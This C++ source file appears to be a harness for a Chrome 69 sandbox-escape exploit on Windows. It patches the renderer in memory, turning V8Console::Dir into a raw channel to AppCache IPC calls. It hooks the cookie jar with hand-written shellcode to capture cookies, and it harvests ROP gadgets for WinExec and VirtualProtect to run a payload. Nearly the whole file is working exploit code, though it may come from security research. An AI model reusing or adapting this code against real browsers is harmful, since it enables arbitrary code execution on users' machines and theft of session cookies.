#include "chrome.h"
#include "internals.h"
#include "common.h"
#include "patch.h"

using namespace std;

bool check_func(void* addr, const char* prefix, int len, const char* msg) {
	char* s = (char*)addr;
	bool valid = 1;
	for (int i = 0; i < len; ++i) {
		valid &= s[i] == prefix[i];
	}
	if (s[0] == 0x49 && s[1] == (char)0xbb) {
		// Repatching is ok
		valid = 1;
	}
	if (!valid) {
		LOG("Invalid prefix for function %s:\n", msg);
		for (int i = 0; i < len; ++i)
			LOG("%02x ", (int)(unsigned char)s[i]);
		LOG("\n");
		return false;
	}
	LOG("Function %s @ %p\n", msg, addr);
	return true;
}

enum commands {
	TEST = 1,
	REGISTER_HOST = 2,
	UNREGISTER_HOST = 3,
	SELECT_CACHE = 4,
	GET_COOKIES = 5,
	GET_GADGETS = 6,
};

//https://cs.chromium.org/chromium/src/chrome/common/extensions/manifest_handlers/settings_overrides_handler.cc?q=CreateManifestURL&l=32&dr=CSs
typedef unique_ptr<GURL> (*f_CreateManifestURL)(const string& url);
f_CreateManifestURL CreateManifestURL;


string* cookies;
void save_cookies(string* c) {
	cookies = new string(*c);
}

const char* find_gadget(const void* buffer, const char* pattern, int size) {
	const char* p = (const char*)buffer;
	for (; memcmp(p, pattern, size); ++p) {
	}
	return p;
}

void V8Console_Dir(void* self, v8::debug::ConsoleCallArguments* args) {
	switch (args->values[0]>>32) {
	case TEST: {
		char* buffer = *(char**)(args->values[-1] - 1 + 0x20);
		buffer[0] = 0x41;
		return;
	}
	case REGISTER_HOST: {
		uint64_t wrapper = args->values[-1] - 1;
		auto* document = *(blink::Document**)(wrapper + 0x20);
		uint32_t host_id = args->values[-2] >> 32;
		content::AppCacheBackend* backend = document->Loader()->application_cache_host->host->backend;
		backend->vtable->RegisterHost(backend, host_id);
		return;
	}
	case UNREGISTER_HOST: {
		uint64_t wrapper = args->values[-1] - 1;
		auto* document = *(blink::Document**)(wrapper + 0x20);
		uint32_t host_id = args->values[-2] >> 32;
		content::AppCacheBackend* backend = document->Loader()->application_cache_host->host->backend;
		backend->vtable->UnregisterHost(backend, host_id);
		return;
	}
	case SELECT_CACHE: {
		uint64_t wrapper = args->values[-1] - 1;
		auto* document = *(blink::Document**)(wrapper + 0x20);

		uint32_t host_id = args->values[-2] >> 32;
		const char* document_url_s = *(const char**)(args->values[-3] - 1 + 0x20);
		uint32_t cache_document_was_loaded_from = args->values[-4] >> 32;
		const char* manifest_url_s = *(const char**)(args->values[-5] - 1 + 0x20);

		GURL* document_url = CreateManifestURL(document_url_s).release();
		GURL* manifest_url = CreateManifestURL(manifest_url_s).release();

		content::AppCacheBackend* backend = document->Loader()->application_cache_host->host->backend;
		backend->vtable->SelectCache(backend, host_id, document_url, 
			cache_document_was_loaded_from, manifest_url);
		return;
	}
	case GET_COOKIES: {
		char* buffer = *(char**)(args->values[-1] - 1 + 0x20);
		if (cookies) {
			uint32_t sz = cookies->size();
			memcpy(buffer, (const char*)&sz, 4);
			memcpy(buffer + 4, cookies->data(), sz);
		} else {
			uint32_t sz = 0;
			memcpy(buffer, (const char*)&sz, 4);
		}
		return;
	}
	case GET_GADGETS: {
		void** buffer = *(void***)(args->values[-1] - 1 + 0x20);
		buffer[0] = GetProcAddress(LoadLibraryA("kernel32"), "WinExec");
		/*
		ntdll!_longjmp_internal+0x95:
		00007ffc`60710705 488b5150        mov     rdx,qword ptr [rcx+50h]
		00007ffc`60710709 488b6918        mov     rbp,qword ptr [rcx+18h]
		00007ffc`6071070d 488b6110        mov     rsp,qword ptr [rcx+10h]
		00007ffc`60710711 ffe2            jmp     rdx
		*/
		buffer[1] = (void*)find_gadget(find_mod("ntdll.dll"), "\x48\x8b\x51\x50\x48\x8b\x69\x18\x48\x8b\x61\x10\xff\xe2", 14);
		buffer[2] = (void*)find_gadget(find_mod("msvcrt.dll"), "\x59\xc3", 2); // pop rcx ; ret
		buffer[3] = (void*)find_gadget(find_mod("msvcrt.dll"), "\x5a\xc3", 2); // pop rdx ; ret
#if SHELLCODE
		buffer[4] = (void*)find_gadget(find_mod("windows.storage.dll"), "\x41\x58\xc3", 3); // pop r8 ; ret

		//0x18007f909: mov r9, rcx; sub r9, rdx; cmp rcx, rdx; mov qword[r8], r9; sbb eax, eax; and eax, 0x80070216; ret
		buffer[5] = (void*)(find_mod("windows.storage.dll") + 0x7f909);

		buffer[6] = GetProcAddress(LoadLibraryA("kernel32"), "VirtualProtect");
#endif
	}
	default:
		return;
	}
}

bool patch_chrome() {
#if 0 // custom build
	// v8!v8_inspector::V8Console::Dir
	void* v8_inspector__V8Console__Dir = find_mod("v8.dll") + 0x9384e0;
	PROP(check_func(
			v8_inspector__V8Console__Dir, 
			"\x56\x48\x83\xec", 4, 
			"v8_inspector::V8Console::Dir"));
	patch_replace(v8_inspector__V8Console__Dir, V8Console_Dir);

	// chrome!extensions::`anonymous namespace'::CreateManifestURL
	// 00007ffb`ff55b652
	CreateManifestURL = (f_CreateManifestURL)(find_mod("chrome.dll") + 0x18eb652);
	PROP(check_func(
		CreateManifestURL,
		"\x56\x57\x53", 3,
		"CreateManifestURL"));

	/*
content!content::RendererWebCookieJarImpl::Cookies:
...
00007ffb`fc9b433c 4c896c2420      mov     qword ptr [rsp+20h],r13
00007ffb`fc9b4341 4889f9          mov     rcx,rdi
00007ffb`fc9b4344 89c2            mov     edx,eax
00007ffb`fc9b4346 4989f0          mov     r8,rsi
00007ffb`fc9b4349 4989d9          mov     r9,rbx
00007ffb`fc9b434c ff5520          call    qword ptr [rbp+20h]   ; virtual call GetCookies

; useless block (destructors) will be replaced with call to store_cookies(r13)
00007ffb`fc9b434f 488b3d3225ed00  mov     rdi,qword ptr [content!_imp_??1GURLQEAAXZ (00007ffb`fd886888)]
00007ffb`fc9b4356 4889f1          mov     rcx,rsi
00007ffb`fc9b4359 be0f000000      mov     esi,0Fh
00007ffb`fc9b435e ffd7            call    rdi
00007ffb`fc9b4360 4889d9          mov     rcx,rbx
00007ffb`fc9b4363 ffd7            call    rdi

00007ffb`fc9b4365 4d8b4510        mov     r8,qword ptr [r13+10h]
00007ffb`fc9b4369 49397518        cmp     qword ptr [r13+18h],rsi

	*/

	char* cookie_patch = find_mod("content.dll") + 0xe7434f;
	LOG("Patching RendererWebCookieJarImpl::Cookies @ %p", cookie_patch);
	DWORD dummy;
	VirtualProtect((void*)((DWORD64)cookie_patch & ~0xfff), 0x2000, PAGE_EXECUTE_READWRITE, &dummy);
	memcpy(cookie_patch, "\x4c\x89\xe9", 3); // mov rcx, r13
	insert_jmp(cookie_patch + 3, save_cookies, 1); // call save_cookies
	memcpy(cookie_patch + 3 + 13, "\xbe\x0f\x00\x00\x00\x90", 6); // mov esi, 0xf

#else // 69.0.3497.100

	// v8!v8_inspector::V8Console::Dir
	void* v8_inspector__V8Console__Dir = find_mod("chrome_child.dll") + 0x14b0440;
	PROP(check_func(
		v8_inspector__V8Console__Dir,
		"\x56\x48\x83\xec", 4,
		"v8_inspector::V8Console::Dir"));
	patch_replace(v8_inspector__V8Console__Dir, V8Console_Dir);

	// chrome!extensions::`anonymous namespace'::CreateManifestURL
	// 00007ffb`ff55b652
	CreateManifestURL = (f_CreateManifestURL)(find_mod("chrome_child.dll") + 0x2ef027e);
	PROP(check_func(
		CreateManifestURL,
		"\x56\x57\x53", 3,
		"CreateManifestURL"));

	/*
content!content::RendererWebCookieJarImpl::Cookies:


00007ffb`f51a474c 48897c2420      mov     qword ptr [rsp+20h],rdi
00007ffb`f51a4751 4889d9          mov     rcx,rbx
00007ffb`f51a4754 89c2            mov     edx,eax
00007ffb`f51a4756 4989e8          mov     r8,rbp
00007ffb`f51a4759 4d89e9          mov     r9,r13
00007ffb`f51a475c ff5620          call    qword ptr [rsi+20h]

; useless 16-byte block (destructors) will be replaced with call to store_cookies(rdi)
00007ffb`f51a475f 4889e9          mov     rcx,rbp
00007ffb`f51a4762 e84de1d2fd      call    chrome_child!GURL::~GURL (00007ffb`f2ed28b4)
00007ffb`f51a4767 4c89e9          mov     rcx,r13
00007ffb`f51a476a e845e1d2fd      call    chrome_child!GURL::~GURL (00007ffb`f2ed28b4)

00007ffb`f51a476f 4c8b4710        mov     r8,qword ptr [rdi+10h]
00007ffb`f51a4773 48837f180f      cmp     qword ptr [rdi+18h],0Fh
	*/

	char* cookie_patch = find_mod("chrome_child.dll") + 0x22e475f;
	size_t cookie_patch_size = 0x10;

	LOG("Patching RendererWebCookieJarImpl::Cookies @ %p", cookie_patch);
	DWORD dummy;
	VirtualProtect((void*)((DWORD64)cookie_patch & ~0xfff), 0x2000, PAGE_EXECUTE_READWRITE, &dummy);

	char* stub = (char*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	insert_jmp(cookie_patch, stub, 0);

	/*
0:  48 81 ec 00 10 00 00    sub    rsp,0x1000
7:  48 89 f9                mov    rcx,rdi
a:  49 bb 41 41 41 41 41    movabs r11,0x4141414141414141
11: 41 41 41
14: 41 ff d3                call   r11
17: 48 81 c4 00 10 00 00    add    rsp,0x1000
1e: 49 bb 42 42 42 42 42    movabs r11,0x4242424242424242
25: 42 42 42
28: 41 ff e3                jmp    r11
	*/

	memcpy(stub,
		"\x48\x81\xec\x00\x10\x00\x00"
		"\x48\x89\xf9"
		"\x49\xbb\x41\x41\x41\x41\x41\x41\x41\x41"
		"\x41\xff\xd3"
		"\x48\x81\xc4\x00\x10\x00\x00"
		"\x49\xbb\x42\x42\x42\x42\x42\x42\x42\x42"
		"\x41\xff\xe3"
		, 0x30);
	void* target = save_cookies;
	memcpy(stub + 0xa + 2, &target, 8);
	target = cookie_patch + cookie_patch_size;
	memcpy(stub + 0x1e + 2, &target, 8);

#endif
}